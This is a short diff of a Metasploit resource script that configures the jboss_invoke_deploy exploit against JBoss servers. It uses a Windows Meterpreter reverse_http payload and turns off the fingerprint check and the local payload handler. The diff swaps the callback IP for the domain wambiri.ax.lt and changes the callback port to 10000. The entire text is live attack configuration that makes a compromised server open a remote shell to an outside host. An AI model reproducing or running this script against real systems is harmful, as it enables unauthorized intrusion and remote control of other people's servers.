@@ -1,10 +1,10 @@
 use exploit/multi/http/jboss_invoke_deploy
 set TARGET 2
 set PAYLOAD windows/meterpreter/reverse_http
-set LHOST 120.145.144.97
+set LHOST wambiri.ax.lt
 set DisablePayloadHandler true
 set FingerprintCheck false
-set LPORT 8080
+set LPORT 10000
 set RPORT 80
 set SSL false
 
